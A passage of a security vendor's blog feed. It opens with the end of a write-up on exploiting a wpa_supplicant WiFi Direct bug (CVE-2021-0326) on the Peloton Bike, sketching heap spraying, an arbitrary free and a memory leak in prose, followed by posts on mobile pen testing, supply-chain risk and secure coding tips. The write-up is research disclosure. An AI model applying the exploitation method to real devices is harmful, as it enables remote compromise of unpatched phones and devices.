<p>The <code> P2P_DEV_PROBE_REQ_ONLY</code> flag allows the device data to be updated in <code> p2p_add_group_clients</code></p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
if (dev) {
		if (dev-&gt;flags &amp; (P2P_DEV_GROUP_CLIENT_ONLY |
					P2P_DEV_PROBE_REQ_ONLY)) {
			/*
			 * Update information since we have not
			 * received this directly from the client.
			 */
			p2p_copy_client_info(dev, cli);
</pre></div>


<p>This allows the <code> wfd_subelems</code> field to be partially overwritten by 4 bytes (due to the 8 byte writes being offset by padding). This provides the correct most significant byte to the arbitrary address to free. Alternatively the entire pointer can be overwritten with zeros which will prevent the allocation from ever being freed (the other kind of memory leak). The <code> wfd_subelems</code> can be large allocations with data almost entirely controlled by the attacker and over potentially many WiFi Direct scans the heap can be sufficiently sprayed to allow a guessed arbitrary address to be freed. Ideally the size of the <code> wfd_subelems</code> can be selected such that when reallocated this memory contains a <code> wpabuf</code> that is part of data sent back to the attacker (in the content of a beacon or probe response). Next the <code> address-0x20</code> can be freed allowing the attacker to overwrite the size of the <code> wpabuf</code> to make it larger. In subsequent beacons or probe responses data from outside the original bounds of the buffer will be sent, potentially exposing memory that can be used to calculate the addresses needed for the exploit.</p>



<p>I have tried very little of this, but it should be possible, and I may try to make it work in the future. I will likely not release that exploit as this vulnerability is wormable, each Android device (and any other device using wpa_supplicant) can infect the ones around it. Though this might not work depending on how frequently devices perform WiFi Direct searches.</p>



<p>Peloton produces another model, the Bike+, which runs Android 9 and the patch for CVE-2021-0326 was deployed by Peloton in June. Additionally CFI (Control Flow Integrity) presents more obstacles to exploitation on Android 9 devices.&nbsp;</p>



<h3><strong>Conclusion</strong></h3>



<p>When I saw that the Peloton Bike had not received an Android security patch for over two years I believed that it would be easy to find a known vulnerability that had been written about sufficiently for an RCE exploit to be relatively easy to achieve. Instead it ended up being an incredibly difficult journey, and even now the exploit is only really half finished. Clearly patching is still very important. However this is hopefully an indication that the core software of the majority of mobile devices, Android, is becoming more secure.&nbsp;</p>



<p>At NowSecure we are committed to making the mobile world safer. Check out <a href="https://www.nowsecure.com/solutions/by-need/mobile-app-security-testing/">NowSecure Platform</a> for automated mobile application security testing and our expert <a href="https://www.nowsecure.com/solutions/by-need/mobile-app-penetration-testing/">mobile penetration testing services</a> to better secure your mobile apps today.</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/02/09/a-zero-click-rce-exploit-for-the-peloton-bike-and-also-every-other-unpatched-android-device/">A Zero-Click RCE Exploit for the Peloton Bike  (And Also Every Other Unpatched Android Device)</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></content:encoded>
    </item>
    <item>
      <title>An App Development Leader’s Guide to Mobile Penetration Testing</title>
      <link>https://www.nowsecure.com/blog/2022/01/26/an-app-development-leaders-guide-to-mobile-penetration-testing/</link>
      <dc:creator><![CDATA[Amy Schurr]]></dc:creator>
      <pubDate>Wed, 26 Jan 2022 14:30:00 +0000</pubDate>
      <category><![CDATA[Best Practices]]></category>
      <category><![CDATA[Mobile Security Solutions]]></category>
      <guid isPermaLink="false">https://www.nowsecure.com/?p=16204</guid>
      <description><![CDATA[<p>Hurrying to meet an aggressive deadline, your mobile application development team will soon complete major updates to the company’s flagship Android and iOS applications. The project progresses smoothly until you discover that one major obstacle stands in the way of on-time release: nobody remembered to line up mobile penetration testing to validate mobile application security.&#160;</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/01/26/an-app-development-leaders-guide-to-mobile-penetration-testing/">An App Development Leader’s Guide to Mobile Penetration Testing</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></description>
      <content:encoded><![CDATA[
<p>Hurrying to meet an aggressive deadline, your mobile application development team will soon complete major updates to the company’s flagship Android and iOS applications. The project progresses smoothly until you discover that one major obstacle stands in the way of on-time release: nobody remembered to line up <a href="https://www.nowsecure.com/solutions/by-need/mobile-app-penetration-testing/"><strong>mobile penetration testing</strong></a> to validate mobile application security.&nbsp;</p>



<p>Mobile app dev leaders need not panic. Not only do <a href="https://www.nowsecure.com/solutions/by-need/mobile-app-security-testing/">mobile application security </a>companies like NowSecure offer both expert quick-turn with rapid mobile penetration testing services and full-scope mobile penetration testing services to fit the varied needs of organizations, but engaging an outside pen testing provider for an in-depth mobile app security and privacy review will ultimately help mobile DevSecOps teams increase efficiency and go faster. </p>



<p>That’s right — security shouldn’t slow you down, it should speed you up. Imagine how much time you’d waste having to pull an app back from the public app store or issuing a hotfix. Or worse, attackers might discover vulnerabilities first and use your app to expose sensitive data or compromise intellectual property. The company would lose time, money and customers.&nbsp;</p>



<h2>What Is Mobile Application Penetration Testing?</h2>



<p>To perform a mobile pen test, security analysts conduct an in-depth examination of an app from an attacker’s perspective to search for security, privacy and compliance risks in apps, on devices and across the network. Some of the common problems mobile application penetration tests uncover are insecure communication, inadequate form validation, unsafe data storage, hardcoded passwords and keys and improper access to device functionality.&nbsp;</p>



<p>Mobile application penetration tests provide mobile app developers with valuable information about what issues to fix, why and how. Think of it as part of the mobile DevSecOps feedback loop that helps your team hone their <a href="https://academy.nowsecure.com/plan/secure-mobile-development-certification">secure coding</a> best practices and learn how to build better mobile apps via continuous improvement. The next time developers need to craft an app, they can apply their knowledge about <a href="https://www.nowsecure.com/blog/2020/07/22/infographic-the-top-5-mobile-app-security-issues-and-how-developers-can-avoid-them/">mistakes</a> to avoid.&nbsp;</p>



<h2>Apps That Require Mobile Penetration Testing</h2>



<p>Your organization likely recognizes the value of automated mobile application security testing. Integrated and automated continuous testing throughout the software development lifecycle<em> </em>enables teams to catch security issues early on when they’re easier and cheaper to fix. However, automation cannot test every possible scenario. </p>



<p>High-risk mobile apps warrant the assurance of manual, deep full-scope mobile application penetration tests. In some cases, senior business leaders, governance teams,&nbsp; security auditors or customers may request a pen test or it may be required for regulatory compliance. Follow best practices by arranging to pen test the following types of apps:</p>



<ul><li>Initial release</li><li>Major update</li><li>Stores or handles sensitive data</li><li>Subject to industry regulations</li><li>Uses Bluetooth Low Energy</li><li>Uses CAPTCHA</li><li>Uses multi-factor authentication</li><li>Supports USB connectivity to external devices</li><li>Runs on a non-standard platform such as automotive or entertainment systems</li><li>Requires defense-in-depth and reverse engineering resiliency</li><li>Requires advanced scoping</li></ul>



<p></p>



<p>Some organizations have dedicated application security analysts they task with performing mobile penetration testing using a complement of specialized mobile penetration testing tools. But many more lack the in-house expertise, resources or tools so they outsource the job to mobile app pen testing service providers.</p>



    <div id="featured-resource-block"
         class="cta-id-15223 resource-id-13865 post-type-resource_item">

                    <div class="image-holder" style="background-image: url(https://www.nowsecure.com/wp-content/uploads/2019/12/Website-design.jpg)"></div>
            <!-- /.image-holder -->

        
        <div class="content-holder">

            <div class="transparent-shape"></div>
            <!-- /.transparent-shape -->
            <div class="grey-shape"></div>
            <!-- /.grey-shape -->

            <div class="content-in">

                                    <h3 class="resource-title">
                        Checklist for Choosing a Mobile App Pen Testing Provider                    </h3>
                    <!-- /.resource-title -->

                
                
                                    <a href="https://discover.nowsecure.com/c/key-criteria-choosing-mobile-app-pen-testing-vendor?x=cEXJzu"
                       target="_blank">

                        Download Now
                    </a>
                    <!-- /.resource-link -->

                
            </div>
            <!-- /.content-in -->

        </div>
        <!-- /.content-holder -->

    </div>
    <!-- /#featured-resource-block -->



<p></p>



<h2>Mobile Penetration Testing Methodology</h2>



<p>Ideally, dev teams will incorporate pen testing into their timelines to complete before the mobile app moves into production and schedule the work in advance as they’re planning major updates.&nbsp; The most successful pen testing engagements include dev involvement at the onset of the project. To kick off the process, the developer lead and pen testers should meet to discuss the mobile app, understand its features and risks, and build trust. In addition, the group will agree on logistics such as how the mobile pen testing team will obtain the mobile app binaries and credentials.&nbsp;</p>



<p>Whether conducted by your organization’s own security analyst or an expert mobile pen testing service provider such as NowSecure, every mobile app pen test should follow a standard process as shown below.</p>



<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/WBoRExWU7L_pR6XjYInrsEdhZEFeIJRyEEmQPm1yBp5xrIjJkx7JHlgnngtKcqXrjf5A2Qei4vjdc02LMVqkXUxDEvi8JpizNB7ewEbML6MEg-4X_DVZYeWOG1gi_Y6kQdt8o_5P" alt=""/></figure>



<p>The team will initially discuss the particular risk profile and security requirements of the mobile app, including the app threat profile, sensitive data, intellectual property and how it might be exploited. Other areas of discussion include corporate security practices and industry compliance considerations.&nbsp;</p>



<p>Mobile application penetration testing methodology assesses an app to unveil potential issues with these attack vectors:</p>



<ul><li>Mobile forensics and data recovery</li><li>Network, web services and API testing</li><li>Server-side analysis</li><li>Reverse engineering and code analysis</li></ul>



<p></p>



<p>Mobile app data located on the device matters because a device could be lost or stolen and fall into the wrong hands. You want to know what data a mobile app sends over the network because it could be leaking sensitive information and transmitting it insecurely. Back-end and API testing matters because an important aspect of mobile application security is what the app is talking to. And finally, tearing apart the mobile app through reverse engineering shows you the information that can be gathered from an attacker’s point of view.</p>



<p>After the mobile pen testing team finishes the initial assessment, the analysts prepare a detailed report that summarizes the results at a high level and documents the findings. A high-quality report should not simply list vulnerabilities, but prioritize with important context about the likelihood of exploit, impact to the organization and level of severity.</p>



<p>And most importantly to developers, the mobile penetration testing report should include helpful guidance about the steps to take to remediate the security, privacy and compliance issues discovered during the assessment. The pen tester, security and dev teams will then meet to discuss the results so the testers can field any questions about the findings or recommended remediation.&nbsp;</p>



<p>Such information gives developers valuable insight to speed the fixes as well as upskill their secure coding practices. With this knowledge, they can improve their overall efficiency to ultimately speed the delivery of high-quality mobile apps. Development teams working together with mobile pen testing ultimately fosters continuous improvement and confidence.</p>



<p>Many companies offer mobile application penetration tests. To choose one that best meets your organization’s needs, download our <a href="https://www.nowsecure.com/resource/checklist-for-choosing-a-mobile-app-pen-testing-provider/">checklist for choosing a mobile penetration testing provider</a> to discover the most important factors to seek.</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/01/26/an-app-development-leaders-guide-to-mobile-penetration-testing/">An App Development Leader’s Guide to Mobile Penetration Testing</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></content:encoded>
    </item>
    <item>
      <title>Why You Should Worry About Attacks on Mobile Software Supply-Chain Security</title>
      <link>https://www.nowsecure.com/blog/2022/01/12/why-you-should-worry-about-attacks-on-mobile-software-supply-chain-security/</link>
      <dc:creator><![CDATA[Amy Schurr]]></dc:creator>
      <pubDate>Wed, 12 Jan 2022 14:00:00 +0000</pubDate>
      <category><![CDATA[Best Practices]]></category>
      <category><![CDATA[Research & Threat Intel]]></category>
      <guid isPermaLink="false">https://www.nowsecure.com/?p=16025</guid>
      <description><![CDATA[<p>Escalating software supply-chain attacks pose a serious threat to the public sector and businesses. Adversaries exploit vulnerabilities in third-party code to compromise a supplier to the vast digital ecosystem downstream. The ripple effect causes widespread disruption, financial loss and reputational damage and even endangers national security.&#160; Consider the enormous impact the SolarWinds software supply chain</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/01/12/why-you-should-worry-about-attacks-on-mobile-software-supply-chain-security/">Why You Should Worry About Attacks on Mobile Software Supply-Chain Security</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></description>
      <content:encoded><![CDATA[
<p>Escalating software supply-chain attacks pose a serious threat to the public sector and businesses. Adversaries exploit vulnerabilities in third-party code to compromise a supplier to the vast digital ecosystem downstream. The ripple effect causes widespread disruption, financial loss and reputational damage and even endangers national security.&nbsp;</p>



<p>Consider the enormous impact the SolarWinds software supply chain attack had on the private sector and U.S. federal, state and local governments then think of the thousands of web and mobile applications that are under attack. Notable mobile apps that suffered <a href="https://www.nowsecure.com/mobile-app-breach-news/">data breaches</a> in 2021 include Apple iMessage, Klarna, ParkMobile, Samsung SecureFolder and Slack.&nbsp;</p>



<p>As developers increasingly rely on code libraries and open-source components to quickly build mobile apps and enterprises deploy more third-party apps, the complexity of the software supply chain grows. The Apple App Store<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> and Google Play<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> house some <a href="https://www.businessofapps.com/data/app-stores/" target="_blank" rel="noreferrer noopener">6 million apps</a> and don’t include countless other custom mobile apps companies develop in house or obtain from vendors and consultants. That makes for a <a href="https://www.nowsecure.com/blog/2021/02/24/beware-of-mobile-app-supply-chain-attacks/">massive threat landscape</a> in which a single weak link can lead to an attacker infiltrating systems around the globe.</p>



<figure class="wp-block-image size-full"><img loading="lazy" width="945" height="475" src="https://www.nowsecure.com/wp-content/uploads/2022/01/MobileAppRiskTracker.png" alt="The NowSecure Mobile Risk Tracker displays the current security, privacy and compliance risks of apps by industry type." class="wp-image-16031" srcset="https://www.nowsecure.com/wp-content/uploads/2022/01/MobileAppRiskTracker.png 945w, https://www.nowsecure.com/wp-content/uploads/2022/01/MobileAppRiskTracker-360x181.png 360w, https://www.nowsecure.com/wp-content/uploads/2022/01/MobileAppRiskTracker-768x386.png 768w, https://www.nowsecure.com/wp-content/uploads/2022/01/MobileAppRiskTracker-240x121.png 240w" sizes="(max-width: 945px) 100vw, 945px" /></figure>



<h2>Breaches Unleash Extensive Damage</h2>



<p>Skyrocketing reports of software supply-chain security incidents demonstrate the struggle to manage software supply-chain risk. The European Union Agency for Cybersecurity (ENISA) estimated a <a href="https://www.enisa.europa.eu/publications/threat-landscape-for-supply-chain-attacks" target="_blank" rel="noreferrer noopener">4x increase </a>in supply-chain attacks in 2021. <a href="https://www.sonatype.com/resources/state-of-the-software-supply-chain-2021" target="_blank" rel="noreferrer noopener">Sonatype research</a> revealed a 650% increase in next-generation cyberattacks against open-source tools over a one-year period. And <a href="https://www.forrester.com/blogs/predictions-2022-continued-uncertainty-forces-attention-on-securing-relationships/" target="_blank" rel="noreferrer noopener">Forrester forecasts</a> that 60% of cybersecurity incidents in 2022 will result from issues with third parties.</p>



<p>Software supply-chain attacks have far-reaching impacts and organizations face considerable challenges and expense to remediate them. A <a href="https://www.cloudbees.com/c/cloudbees-global-security-survey" target="_blank" rel="noreferrer noopener">CloudBees survey</a> revealed 64% of C-suite executives said it would take more than four days to mitigate a software supply-chain security incident. But some may not even know when their businesses are attacked. And a <a href="https://www.bluevoyant.com/resources/managing-cyber-risk-across-the-extended-vendor-ecosystem/" target="_blank" rel="noreferrer noopener">BlueVoyant report</a> found more than one-third of leaders have no way of knowing if or when a cybersecurity issue with a third party arises.</p>



<div class="wp-block-columns">
<div class="wp-block-column">
<figure class="wp-block-image size-large"><img loading="lazy" width="960" height="958" src="https://www.nowsecure.com/wp-content/uploads/2022/01/ThirdPartySecurityIssues-960x958.png" alt="Sixty percent of security issues will be caused by third parties" class="wp-image-16030" srcset="https://www.nowsecure.com/wp-content/uploads/2022/01/ThirdPartySecurityIssues-960x958.png 960w, https://www.nowsecure.com/wp-content/uploads/2022/01/ThirdPartySecurityIssues-360x360.png 360w, https://www.nowsecure.com/wp-content/uploads/2022/01/ThirdPartySecurityIssues-150x150.png 150w, https://www.nowsecure.com/wp-content/uploads/2022/01/ThirdPartySecurityIssues-768x767.png 768w, https://www.nowsecure.com/wp-content/uploads/2022/01/ThirdPartySecurityIssues-240x240.png 240w, https://www.nowsecure.com/wp-content/uploads/2022/01/ThirdPartySecurityIssues.png 1048w" sizes="(max-width: 960px) 100vw, 960px" /></figure>



<p></p>
</div>



<div class="wp-block-column">
<figure class="wp-block-image size-large"><img loading="lazy" width="960" height="958" src="https://www.nowsecure.com/wp-content/uploads/2022/01/CostofSWSupplyChainBreaches-960x958.png" alt="The cost of software supply-chain breaches is ten times higher than traditional breaches" class="wp-image-16029" srcset="https://www.nowsecure.com/wp-content/uploads/2022/01/CostofSWSupplyChainBreaches-960x958.png 960w, https://www.nowsecure.com/wp-content/uploads/2022/01/CostofSWSupplyChainBreaches-360x360.png 360w, https://www.nowsecure.com/wp-content/uploads/2022/01/CostofSWSupplyChainBreaches-150x150.png 150w, https://www.nowsecure.com/wp-content/uploads/2022/01/CostofSWSupplyChainBreaches-768x767.png 768w, https://www.nowsecure.com/wp-content/uploads/2022/01/CostofSWSupplyChainBreaches-240x240.png 240w, https://www.nowsecure.com/wp-content/uploads/2022/01/CostofSWSupplyChainBreaches.png 1048w" sizes="(max-width: 960px) 100vw, 960px" /></figure>



<p></p>
</div>
</div>



<h2>U.S. Government Strengthens Cyberdefenses</h2>



<p>Alarmed by growing risk to the software supply chain, the U.S. government has acted to fight the threat. In 2021, the White House issued an <a href="https://www.whitehouse.gov/briefing-room/presidential-actions/2021/05/12/executive-order-on-improving-the-nations-cybersecurity/" target="_blank" rel="noreferrer noopener">Executive Order mandating cybersecurity </a>requirements for federal agencies, systems integrators, vendors and contractors. “The United States faces persistent and increasingly sophisticated malicious cyber campaigns that threaten the public sector, the private sector, and ultimately the American people’s security and privacy,” <a href="https://www.nowsecure.com/solutions/by-need/mobile-app-federal-cybersecurity-executive-order/">the EO states</a>. “The federal government must take action to rapidly improve the security and integrity of the software supply chain, with a priority on addressing critical software.”</p>



<p></p>



<blockquote class="custom-quote bg-blue color-white">

    <i class="fas fa-quote-left"></i>
	Organizations must rapidly improve the security and integrity of the software supply chain.    <i class="fas fa-quote-right"></i>

	
        <cite>&#8211; White House Executive Order</cite>

	
</blockquote>



<p></p>



<p>In addition, the Cybersecurity and Infrastructure Security Agency (CISA) and the National Institute of Standards and Technology (NIST) recently offered guidance to the private sector about <a href="https://www.cisa.gov/sites/default/files/publications/defending_against_software_supply_chain_attacks_508_1.pdf" target="_blank" rel="noreferrer noopener">mitigating software supply-chain risk</a>. And as part of the cybersecurity EO directive, NIST has defined <a href="https://www.nist.gov/system/files/documents/2021/10/13/EO%20Critical%20FINAL.pdf" target="_blank" rel="noreferrer noopener">critical software</a> and is updating a set of best practices for <a href="https://www.whitehouse.gov/briefing-room/statements-releases/2021/08/25/fact-sheet-biden-administration-and-private-sector-leaders-announce-ambitious-initiatives-to-bolster-the-nations-cybersecurity/" target="_blank" rel="noreferrer noopener">secure software delivery</a> and <a href="https://www.csoonline.com/article/3644454/nist-gears-up-for-software-security-and-iot-labeling-pilot-programs.html" target="_blank" rel="noreferrer noopener">software labeling</a>.</p>



<p></p>



    <div id="featured-resource-block"
         class="cta-id-15731 resource-id-15724 post-type-post">

                    <div class="image-holder" style="background-image: url(https://www.nowsecure.com/wp-content/uploads/2021/10/SBOM-Launch-blog-SBOM-summry-Oct21.jpg)"></div>
            <!-- /.image-holder -->

        
        <div class="content-holder">

            <div class="transparent-shape"></div>
            <!-- /.transparent-shape -->
            <div class="grey-shape"></div>
            <!-- /.grey-shape -->

            <div class="content-in">

                                    <h3 class="resource-title">
                        Announcing the World’s First Dynamic Software Bill of Materials (SBOM) for Mobile Apps                    </h3>
                    <!-- /.resource-title -->

                
                                    <p class="resource-subtitle">
                        Early Access Program Enables Organizations to Access Dynamically Generated SBOMs for Any Mobile App Binary                    </p>
                    <!-- /.resource-title -->

                
                                    <a href="https://www.nowsecure.com/blog/2021/10/05/announcing-world-first-dynamic-software-bill-of-materials-sbom-for-mobile-apps/"
                       target="_self">

                        Sign Up Now
                    </a>
                    <!-- /.resource-link -->

                
            </div>
            <!-- /.content-in -->

        </div>
        <!-- /.content-holder -->

    </div>
    <!-- /#featured-resource-block -->



<p></p>



<h2>Safeguard the Mobile App Supply Chain</h2>



<p>Security and DevSecOps leaders should adopt <a href="https://www.nowsecure.com/products/nowsecure-data/">cyber supply chain risk management</a> strategies to safeguard their mobile applications from attack. Here are a few initial steps to take.</p>



<ul><li>Create and maintain a <a href="https://www.nowsecure.com/blog/2021/10/05/announcing-world-first-dynamic-software-bill-of-materials-sbom-for-mobile-apps/">Software Bill of Materials (SBOM)</a> to uncover risks hiding in open-source and third-party components that your development team uses to build mobile apps.&nbsp;</li><li>Ask your software vendors to provide SBOMs and confirmation that their mobile apps are safe to use.&nbsp;</li><li>Gain visibility into your existing mobile app portfolio by conducting an inventory and <a href="https://www.nowsecure.com/solutions/by-need/mobile-app-vetting/">vetting for security, privacy and compliance </a>issues.&nbsp;</li><li>Perform <a href="https://www.nowsecure.com/solutions/by-need/mobile-devsecops/">continuous monitoring</a> to stay on top of new vulnerabilities or dependency changes that introduce security, privacy or compliance risks.</li></ul>



<p>Get started by exploring NowSecure solutions for mobile app <a href="https://www.nowsecure.com/products/nowsecure-data/">supply-chain risk management </a>and get a <a href="https://info.nowsecure.com/free-dynamic-SBOMs.html">free SBOM report</a> to uncover areas of risk hiding in your mobile apps.</p>



<h2>About NowSecure</h2>



<p>NowSecure offers a comprehensive suite of <a href="https://www.nowsecure.com/solutions/by-need/mobile-app-security-testing/">automated mobile app securit</a>y and privacy testing solutions, <a href="https://www.nowsecure.com/products/nowsecure-mobile-app-penetration-testing-services/">mobile penetration testing</a> and <a href="https://www.nowsecure.com/products/nowsecure-academy-mobile-appsec-training/">training services</a> to reduce risk. Trusted by many of the world’s most demanding organizations, NowSecure protects millions of app users across banking, insurance, high tech, retail, healthcare, government, IoT and others. As the recognized expert in mobile app security, NowSecure was recently named a mobile security testing leader by IDC, a DevSecOps transformational leader by Gartner, a Deloitte Technology Fast 500 winner and a TAG Distinguished Vendor.</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/01/12/why-you-should-worry-about-attacks-on-mobile-software-supply-chain-security/">Why You Should Worry About Attacks on Mobile Software Supply-Chain Security</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></content:encoded>
    </item>
    <item>
      <title>30+ Secure Mobile App Development Tricks to Try In 2022</title>
      <link>https://www.nowsecure.com/blog/2021/12/22/30-secure-mobile-app-development-tricks-to-try-in-2022/</link>
      <dc:creator><![CDATA[Matthew F]]></dc:creator>
      <pubDate>Wed, 22 Dec 2021 12:00:00 +0000</pubDate>
      <category><![CDATA[Best Practices]]></category>
      <guid isPermaLink="false">https://www.nowsecure.com/?p=15981</guid>
      <description><![CDATA[<p>Mobile app developers constantly face pressure to catch up with or leap ahead of the competition. Innovative mobile features certainly improve the user experience, but the accelerated pace of mobile app development often shortchanges security.&#160; DevSecOps teams can speed the delivery of high-quality mobile apps by performing continuous security testing throughout the software development lifecycle</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2021/12/22/30-secure-mobile-app-development-tricks-to-try-in-2022/">30+ Secure Mobile App Development Tricks to Try In 2022</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></description>
      <content:encoded><![CDATA[
<p>Mobile app developers constantly face pressure to catch up with or leap ahead of the competition. Innovative <a href="https://www.nowsecure.com/blog/2020/04/10/3-innovative-technologies-for-enterprise-mobile-apps/">mobile features</a> certainly improve the user experience, but the accelerated pace of mobile app development often shortchanges security.&nbsp;</p>



<p>DevSecOps teams can <a href="https://www.nowsecure.com/blog/2021/05/26/five-developer-secrets-to-speeding-mobile-devsecops/">speed the delivery of high-quality mobile apps</a> by performing <a href="https://www.nowsecure.com/solutions/by-need/mobile-devsecops/">continuous security testing</a> throughout the software development lifecycle (SDLC) and relying on mobile DevSecOps tools that can help ease remediation. And of course, honing their craft by adopting secure coding techniques helps devs prevent security and privacy issues from creeping into their Android and iOS mobile apps in the first place.&nbsp;<br>As one of the leading mobile application security companies, NowSecure experts have conducted thousands of mobile application penetration tests that uncover <a href="https://www.nowsecure.com/blog/2020/07/22/infographic-the-top-5-mobile-app-security-issues-and-how-developers-can-avoid-them/">common security and privacy vulnerabilities</a>. What follows is a roundup of technical tips we’ve shared in our twice monthly <a href="https://info.nowsecure.com/newsletter-subscribe.html">All Things Mobile DevSecOps newsletter</a>. Subscribe now and catch up on previous pointers in this <a href="https://www.nowsecure.com/blog/2020/06/17/secure-mobile-app-development-tips-31-flavors-summer-edition/">compilation of secure mobile app development advice</a>.</p>



<h2><strong>Local Data Exposure</strong></h2>



<ul><li>Anonymize data that your mobile app collects and, better yet, delete it as soon as possible.</li><li>If your Android app uses a WebView to access sensitive data, you can use the clearCache() method to delete any locally-stored files.</li><li>Developers and security experts should always assume that mobile code will be reverse engineered — it’s typically the starting point for an attacker. Avoid storing valuable and sensitive information locally on the device.  </li></ul>



<h2><strong>Network Defense-in-Depth &amp; Communication</strong></h2>



<ul><li>Ensure apps use proper network security standards for communications, endpoints are well configured and you have a robust authentication scheme to prevent a broad range of network attacks.</li><li>Leverage App Transport Security (ATS) for ioS and Network Security Configuration for Android for secure mobile app connections.</li><li>Before mobile developers add networking functionality to their mobile app, consider networking security best practices: limit user data over the network, send traffic over secure communication and consider which certificates your mobile app should trust.</li><li>The best way (and really the only way) to test mobile app certificate pinning is to execute an MiTM attack against it.</li></ul>



<h2><strong>Authentication &amp; Authorization</strong></h2>



<ul><li>Make sure your app follows the security principle of least privilege by ensuring your app only requests the minimal level of permissions needed for the app to work.</li><li>Run authorization checks for roles and permissions of an authenticated user at the server-side rather than client-side.</li><li>When overriding methods that perform certificate validation and/or hostname verification in Android (such as the checkServerTrusted method) always make sure to include proper validations in order to prevent MITM attacks.&nbsp;</li></ul>



<h2><strong>Cryptography</strong></h2>



<ul><li>Misuse of cryptography has become a common source of vulnerabilities in mobile apps and necessitates security testing prior to release.</li><li>If an iOS app must encrypt contents on disk, developers should protect users’ data by using the highest level of file protection: complete.</li><li>In 2019, Apple introduced CryptoKit to make iOS developers&#8217; lives easier in performing cryptographic operations — this high-level Swift API can save you time and give your app solid security.</li></ul>



<h2><strong>Code Quality</strong></h2>



<ul><li>Ensure that your apps use the latest, most secure versions of SDKs. Stay abreast of security news to identify vulnerable versions of SDKs and remove them from your app or use alternatives.</li><li>Remove unused or irrelevant pieces of code and debugging data to improve runtime performance and reduce the attack vector.</li><li>Practice secure coding by avoiding using query strings in sensitive data.&nbsp;</li><li>Review the application&#8217;s code to ensure methods and functions perform their intended functionalities and don&#8217;t grant unintended app privileges such as unnecessary file permissions or content loading. This is especially important when referencing JavaScript Interfaces on Android.</li><li>When a user transitions the application to the background, the system takes a &#8220;snapshot&#8221; of the applications main window. Developers should remove any sensitive data from views before moving to the background.&nbsp;</li></ul>



<p></p>



    <div id="featured-resource-block"
         class="cta-id-15582 resource-id-15554 post-type-page">

                    <div class="image-holder" style="background-image: url(https://www.nowsecure.com/wp-content/uploads/2021/08/academy.png)"></div>
            <!-- /.image-holder -->

        
        <div class="content-holder">

            <div class="transparent-shape"></div>
            <!-- /.transparent-shape -->
            <div class="grey-shape"></div>
            <!-- /.grey-shape -->

            <div class="content-in">

                                    <h3 class="resource-title">
                        NowSecure Academy Mobile AppSec Training                    </h3>
                    <!-- /.resource-title -->

                
                
                                    <a href="https://www.nowsecure.com/products/nowsecure-academy-mobile-appsec-training/"
                       target="_self">

                        Get Started for Free with Mobile AppSec Training
                    </a>
                    <!-- /.resource-link -->

                
            </div>
            <!-- /.content-in -->

        </div>
        <!-- /.content-holder -->

    </div>
    <!-- /#featured-resource-block -->



<p></p>



<h2><strong>Reverse Engineering &amp; App Resiliency</strong></h2>



<ul><li>Use code obfuscation on all production builds to mitigate the risk of reverse engineering.</li><li>Use the AndroidSafetyNet API to check for Android device tampering and guard against reverse engineering.</li><li>Avoid using hardcoded sources as much as possible. Hardcoding data in your application&#8217;s source code (credentials, cryptographic keys and similar, sensitive sources) represents an easy attack vector via reverse engineering.&nbsp;</li><li>When pushing an app to production, make sure to clear all hard-coded data that&#8217;s been used for QA testing.</li><li>Employ memory protection techniques such as buffer overflow protection or binary stirring to guard against threats.</li><li>Having unprotected content providers in your app increases its attack surface, potentially allowing malicious apps to target your app via dangerous attacks such as SQL injection and path traversal.</li></ul>



<h2><strong>Threat Modeling</strong></h2>



<ul><li>The best way to implement a strong and healthy app is by performing a basic security posture of your mobile app: a threat model. Seek to understand what your app may be vulnerable to out in the wild.</li><li>Raise the bar in your app by making sure threat modeling guides your security controls.</li><li>Consult the OWASP Mobile Application Security Verification Standards (MASVS) as a starting point for threat modeling.</li><li>Base mobile app security requirements on standards such as the OWASP MASVS.</li></ul>



<h2><strong>Mobile Application Security Testing</strong></h2>



<ul><li>Perform penetration testing to verify that a mobile app’s backend is secure.</li><li>Perform a thorough penetration test before launching or releasing a major update of a sensitive mobile app to ensure quality.</li><li>Those who use low-code development tools should be sure to test the mobile app binaries to pinpoint security risks such as misconfigured permissions or leaking data.</li><li>Test a mobile app binary rather than uncompiled format or source code because the binary is what’s released to the wild and what an attacker might actually target.</li><li>Ensure you deploy a mobile application security testing tool from a trusted vendor that pinpoints vulnerabilities yet minimizes false positives.</li><li>When implementing WebViews in your Android application, utilize free security functionality such as EnableSafeBrowsing and cache clearing. These in addition to disabling debuggable WebViews will make your app/WebViews less prominent to attacks.</li></ul>



<h2><strong>Upcoming Mobile OS Changes</strong></h2>



<p>Many Android developers know that as of November 2021, Android app updates must target API level 30 or above. Be prepared to make changes to keep your app current and adjust for app behavioral changes as well as <a href="https://www.nowsecure.com/blog/2021/07/21/android-12-security-and-privacy-updates/">Android 12 security and privacy enhancements</a>. And iOS developers should mark their calendars for April 2022. As of that date, all ioS and iPadOS apps must be built with Xcode 13 and the iOS 15 SDK when submitting to the Apple App Store.</p>



